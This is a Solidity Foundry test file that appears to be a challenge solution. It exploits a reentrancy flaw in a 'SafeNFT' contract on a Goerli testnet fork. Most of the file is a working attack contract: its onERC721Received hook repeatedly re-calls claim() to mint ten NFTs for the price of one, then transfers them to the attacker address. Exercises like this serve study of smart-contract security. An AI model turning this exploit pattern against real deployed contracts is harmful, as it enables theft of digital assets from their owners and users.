// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/SafeNFT.sol";

contract SafeNFTSolution is Test {

    //Claim multiple NFTs for the price of one.

    SafeNFT public target;
    Receiver public attackContract;
    address public goerliDeployment = 0xf0337Cde99638F8087c670c80a57d470134C3AAE;


    function setUp() public {
        uint256 forkId = vm.createSelectFork(vm.rpcUrl("goerli"));
        target = SafeNFT(goerliDeployment);
    }

    function testSolve() public {

        uint256 forkId = vm.createSelectFork(vm.rpcUrl("goerli"));

         address myAddress = address(0x01);
         vm.deal(myAddress, 1 ether);
         vm.startPrank(myAddress);

        attackContract = new Receiver(goerliDeployment);
        attackContract.buyAndClaimThenWithdraw{value: 10000000000000000}();
       
        console.log("amount of nfts in attack contract: ",target.balanceOf(address(attackContract)));
        console.log("amount of nfts in myAddress: ",target.balanceOf(address(myAddress)));
        console.log("leftover funds: ", address(myAddress).balance);
        console.log("success");
    }

}

contract Receiver is IERC721Receiver {

    uint256 public maxClaim;
    SafeNFT public target; 

    constructor(address goerliaddr) {
        target = SafeNFT(goerliaddr);
    }
    function buyAndClaimThenWithdraw() public payable {
        target.buyNFT{value: msg.value}();
        target.claim();
        withdraw();
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
    
    if(maxClaim < 9){
        maxClaim++;
        msg.sender.call(abi.encodeWithSignature("claim()"));   
    }

    return IERC721Receiver.onERC721Received.selector;
    }

    function withdraw() internal {
        int currentSupply = int(target.totalSupply() - 10);
        for (int i = currentSupply; i < currentSupply + 10; ++i) {
            target.transferFrom(address(this), address(0x01), uint256(i));
        }
    }


}